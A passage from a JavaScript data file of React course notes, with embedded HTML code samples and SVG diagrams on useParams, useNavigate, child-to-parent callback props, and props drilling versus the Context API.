            <pre class="notes-code-block"><code>import React, { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import axios from 'axios';

function UserProfile() {
  // Extract dynamic segment from URL (e.g. /user/sarthak &rarr; username = 'sarthak')
  const { username } = useParams();
  const [profileData, setProfileData] = useState(null);

  useEffect(() => {
    // Fetch profile whenever username parameter in URL changes
    axios.get('https://api.github.com/users/' + username)
      .then(res => setProfileData(res.data))
      .catch(err => console.error('Failed to load profile:', err));
  }, [username]); // Re-fetch if URL changes to another user

  if (!profileData) return &lt;div className="p-6"&gt;Loading user @{username}...&lt;/div&gt;;

  return (
    &lt;div className="p-6 max-w-sm mx-auto border rounded-xl bg-card shadow-sm text-center"&gt;
      &lt;img src={profileData.avatar_url} alt={username} className="w-24 h-24 rounded-full mx-auto" /&gt;
      &lt;h3 className="text-xl font-bold mt-3"&gt;{profileData.name}&lt;/h3&gt;
      &lt;p className="text-text-muted text-sm"&gt;@{username}&lt;/p&gt;
      &lt;p className="text-sm mt-2"&gt;{profileData.bio}&lt;/p&gt;
    &lt;/div&gt;
  );
}

export default UserProfile;</code></pre>
          `
        },
        {
          num: "40.3",
          title: "Programmatic Navigation With the useNavigate() Hook",
          content: `
            <p>
              While <code>&lt;Link&gt;</code> handles user-initiated clicks, you often need to redirect the user <strong>imperatively in JavaScript code</strong>—such as redirecting to the dashboard after a successful login, navigating to the payment screen after order checkout, or moving back in history.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The <code>useNavigate()</code> Hook:</strong>
                <pre class="notes-code-block"><code>import { useNavigate } from 'react-router-dom';

function LoginForm() {
  const navigate = useNavigate();

  const handleLogin = async (e) => {
    e.preventDefault();
    const isSuccess = await authenticateUser();

    if (isSuccess) {
      // 1. Standard forward navigation:
      navigate('/dashboard');

      // 2. Replace history entry (user cannot hit Back to return to login screen):
      // navigate('/dashboard', { replace: true });

      // 3. Relative back navigation (identical to browser Back button):
      // navigate(-1);
    }
  };

  return &lt;form onSubmit={handleLogin}&gt;...&lt;/form&gt;;
}</code></pre>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 40.2 · Dynamic Route Parsing &amp; History Stack Navigation</span>
                <span class="diagram-frame-tag">DYNAMIC &amp; IMPERATIVE ROUTING</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Visual explanation of useParams extracting tokens from URL and useNavigate pushing/popping frames on the browser history stack">
                  <!-- Dynamic Params -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="242" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="136" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">DYNAMIC PARAMETER (useParams)</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">URL Token Deserialization</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">Route Pattern:  /courses/:id</text>
                    <text x="25" y="118" class="svg-mono-xs">Browser URL:    /courses/frontend</text>
                    <text x="25" y="138" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">useParams() -&gt; { id: 'frontend' }</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-muted);">Eliminates redundant static route files</text>
                  </g>

                  <!-- useNavigate -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="264" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="147" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">IMPERATIVE ROUTING (useNavigate)</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Browser History Stack Control</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">navigate('/cart')   -&gt; Pushes frame to stack</text>
                    <text x="25" y="118" class="svg-mono-xs">navigate(-1)        -&gt; Pops 1 frame (Back)</text>
                    <text x="25" y="138" class="svg-mono-xs">navigate(1)         -&gt; Advances 1 frame (Next)</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">Used inside async callbacks &amp; auth flows ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 41
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-41-child-to-parent-data-flow",
      number: "41",
      shortLabel: "Child-to-Parent Data Flow",
      title: "Updating Parent State from a Child Component (Child-to-Parent Data Flow)",
      summary: "Unidirectional data flow principles, inverted data flow mechanics via callback props, shallow callback delegation, and recognizing the props drilling bottleneck requiring Context API.",
      subtopicLabels: ["41.1 Unidirectional Data Flow", "41.2 Callback Inversion", "41.3 Props Drilling vs Context"],
      diagramCount: 2,
      sections: [
        {
          num: "41.1",
          title: "Unidirectional Data Flow & The Callback Inversion Principle",
          content: `
            <p>
              In React's architectural philosophy, data strictly flows in one direction: <strong>downwards from parent components to child components via props</strong> (Unidirectional Data Flow). A child component cannot directly reach into a parent component to mutate its variables.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Architectural Question:</strong> How does a child component notify its parent of a change (e.g. user clicks "Logout" in a child Navbar, but the <code>user</code> state is owned by the top-level <code>App</code> component)?</li>
              <li><strong>The Solution — Callback Inversion:</strong>
                <ul class="notes-sub-list">
                  <li>The parent defines the state and a function to update that state.</li>
                  <li>The parent passes that function <strong>down to the child as a prop</strong>.</li>
                  <li>When the user interacts with the child, the child invokes that function, optionally passing payload data back up to the parent!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 41.1 · Unidirectional Props Flow vs. Inverted Setter Callback Execution</span>
                <span class="diagram-frame-tag">DATA FLOW ARCHITECTURE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Visual diagram showing top down flow of props theme and setTheme, and bottom up execution of callback on button click">
                  <!-- Parent Box -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="380" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="189" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="109.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PARENT COMPONENT (App)</text>
                    <text x="190" y="58" text-anchor="middle" class="svg-title">Single Source of Truth</text>

                    <rect x="15" y="74" width="350" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">const [theme, setTheme] = useState('light')</text>
                    <text x="25" y="118" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">Passes: &lt;Navbar theme={theme} setTheme={setTheme} /&gt;</text>
                    <text x="25" y="138" class="svg-mono-xs">Receives callback invocation</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-muted);">Re-renders whole tree with theme='dark'</text>
                  </g>

                  <!-- Child Box -->
                  <g transform="translate(475, 20)">
                    <rect x="0" y="0" width="380" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="204" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="117" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">CHILD COMPONENT (Navbar)</text>
                    <text x="190" y="58" text-anchor="middle" class="svg-title">Event Consumer &amp; Dispatcher</text>

                    <rect x="15" y="74" width="350" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">Receives props: { theme, setTheme }</text>
                    <text x="25" y="118" class="svg-mono-xs">User clicks: &lt;button onClick={changeTheme}&gt;</text>
                    <text x="25" y="138" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">props.setTheme('dark') is executed ✓</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">Child never mutates props directly</text>
                  </g>

                  <!-- Middle Arrow -->
                  <path d="M 405 115 L 475 115" fill="none" stroke="var(--border)" stroke-width="2" stroke-dasharray="4 3"/>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "41.2",
          title: "Passing State Setters & Callback Handlers in Practice",
          content: `
            <p>
              There are two primary patterns for child-to-parent communication:
            </p>

            <ul class="notes-bullet-list">
              <li><strong>Pattern A: Passing the State Dispatcher Directly:</strong>
                <pre class="notes-code-block"><code>// Parent:
const [user, setUser] = useState('Sarthak');
return &lt;Navbar setUser={setUser} /&gt;;

// Child:
function Navbar({ setUser }) {
  return &lt;button onClick={() => setUser('Guest')}&gt;Log Out&lt;/button&gt;;
}</code></pre>
              </li>
              <li><strong>Pattern B: Passing a Semantic Callback Function (Senior Standard):</strong>
                <ul class="notes-sub-list">
                  <li>Passing <code>setUser</code> directly tightly couples the child to the parent's state implementation. A more maintainable approach is passing a semantic handler like <code>onLogout</code>:</li>
                </ul>
                <pre class="notes-code-block"><code>// Parent (App.jsx):
import React, { useState } from 'react';
import Navbar from './Navbar';

function App() {
  const [currentUser, setCurrentUser] = useState('Sarthak');

  const handleUserLogout = () => {
    console.log('Logging out user...');
    setCurrentUser(null);
  };

  return (
    &lt;div className="min-h-screen bg-canvas"&gt;
      {/* Pass handler down as semantic prop */}
      &lt;Navbar user={currentUser} onLogout={handleUserLogout} /&gt;
      &lt;main className="p-6"&gt;
        {currentUser ? &lt;h2&gt;Welcome back, {currentUser}!&lt;/h2&gt; : &lt;h2&gt;Please log in.&lt;/h2&gt;}
      &lt;/main&gt;
    &lt;/div&gt;
  );
}

export default App;</code></pre>
              </li>
            </ul>
          `
        },
        {
          num: "41.3",
          title: "The Props Drilling Anti-Pattern vs. React Context API",
          content: `
            <p>
              While passing callbacks works cleanly across 1 or 2 component levels (e.g. <code>App &rarr; Navbar</code>), it breaks down in deep component hierarchies:
            </p>

            <ul class="notes-bullet-list">
              <li><strong>What is "Props Drilling"?</strong>
                <ul class="notes-sub-list">
                  <li>When you have to pass a prop through 4, 5, or 6 intermediate components that do not need the data themselves, simply to reach a deeply nested leaf component:
                    <br><code>App &rarr; Dashboard &rarr; SidePanel &rarr; UserWidget &rarr; LogoutButton</code>
                  </li>
                  <li>Every intermediate component is burdened with unused props, cluttering code and making refactoring a maintenance nightmare.</li>
                </ul>
              </li>
              <li><strong>The Production Solution:</strong>
                <ul class="notes-sub-list">
                  <li>When data needs to be accessed globally across unrelated components (theme, authenticated user, shopping cart), use the <strong>React Context API</strong> (<code>createContext</code>, <code>useContext</code>) or state management stores (Zustand, Redux Toolkit) to broadcast data directly across the tree without drilling!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 41.2 · Shallow Callback Inversion vs. The Deep Props Drilling Bottleneck</span>
                <span class="diagram-frame-tag">ARCHITECTURE COMPARISON</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Comparison showing clean 1-level callback inversion vs messy 4-level props drilling requiring Context API">
                  <!-- Clean 1-Level -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="242" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="136" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">SHALLOW CALLBACK (1-2 LEVELS)</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Direct Setter Delegation</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">App (Owns State) -&gt; Navbar (Consumes Callback)</text>
                    <text x="25" y="118" class="svg-mono-xs" style="fill:var(--accent-gold); font-weight:700;">• Direct 1-hop prop connection ✓</text>
                    <text x="25" y="138" class="svg-mono-xs">• High readability &amp; easy refactoring</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-muted);">Standard pattern for localized sibling/child UI</text>
                  </g>

                  <!-- Deep Drilling -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="219" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.2"/>
                    <text x="124.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">PROPS DRILLING (4+ LEVELS)</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Architectural Anti-Pattern</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">App -&gt; Dashboard -&gt; Nav2 -&gt; Panel -&gt; Button</text>
                    <text x="25" y="118" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">• Intermediate components burdened with unused props</text>
                    <text x="25" y="138" class="svg-mono-xs">• Brittle refactoring &amp; maintenance headache</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">Solution: Migrate to React Context API ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    }
  ]
};
